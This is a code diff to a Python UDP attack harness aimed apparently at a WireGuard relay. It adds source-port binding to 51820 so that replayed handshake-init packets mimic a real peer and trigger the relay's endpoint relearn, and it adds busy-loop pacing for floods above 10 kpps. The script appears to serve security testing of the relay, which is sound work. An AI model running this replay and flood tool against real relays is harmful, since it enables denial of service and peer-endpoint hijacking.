@@ -104,12 +104,24 @@ def _make_replay_builder(payload_path):
 
 
 def run_attack(target, mode, pps, duration_s, output_path,
-               payload_path=None):
-  """Send packets at `pps` for `duration_s` seconds. Spin-paced."""
+               payload_path=None, source_port=0):
+  """Send packets at `pps` for `duration_s` seconds. Spin-paced.
+
+  `source_port=0` (default) lets the kernel pick an ephemeral
+  port. For roaming-replay attacks, set to 51820 — the relay's
+  relearn-candidate logic identifies WG peers partly by source
+  4-tuple, so an ephemeral source doesn't trigger the relearn
+  flow even if the MAC1 matches a known pubkey.
+  """
   host, _, port_s = target.partition(":")
   sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-  # Allow same-port reuse so a second attacker process can run.
   sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+  if source_port:
+    try:
+      sock.bind(("0.0.0.0", source_port))
+    except OSError as e:
+      print(f"warn: bind {source_port} failed: {e}; "
+            "continuing with ephemeral", file=sys.stderr)
   addr = (host, int(port_s))
   if mode == "roaming-replay":
     if not payload_path:
@@ -119,6 +131,12 @@ def run_attack(target, mode, pps, duration_s, output_path,
   else:
     builder = _BUILDERS[mode]
 
+  # Above ~10 kpps Python's `time.sleep` granularity (kernel HZ
+  # 100/250) can't pace per-packet. Busy-loop in that regime;
+  # below it, the sleep-pacer keeps CPU low for long-duration
+  # low-rate runs (typical for the amplification + mac1 rows
+  # at 10 kpps, which sleep-pacer handles fine).
+  busy = pps > 10000
   interval_s = 1.0 / max(1, pps)
   end_at = time.time() + duration_s
   sent = 0
@@ -131,12 +149,14 @@ def run_attack(target, mode, pps, duration_s, output_path,
       sent += 1
     except OSError:
       errors += 1
+    if busy:
+      # No sleep; cap at line-rate of the kernel UDP send path.
+      continue
     next_send += interval_s
     sleep_for = next_send - time.time()
     if sleep_for > 0:
       time.sleep(sleep_for)
     elif sleep_for < -interval_s:
-      # We're > 1 packet behind — give up on catching up.
       next_send = time.time()
   sock.close()
   result = {
@@ -174,9 +194,14 @@ def main(argv=None):
                  help="path to a 148-byte WG handshake-init "
                       "payload (roaming-replay only); produced "
                       "by wg_capture.py")
+  p.add_argument("--source-port", type=int, default=0,
+                 help="bind the source UDP port (default 0 = "
+                      "ephemeral; set 51820 for roaming-replay "
+                      "to mimic a real WG peer's source 4-tuple)")
   args = p.parse_args(argv)
   run_attack(args.target, args.mode, args.pps, args.duration_s,
-             args.output, payload_path=args.payload)
+             args.output, payload_path=args.payload,
+             source_port=args.source_port)
 
 
 if __name__ == "__main__":
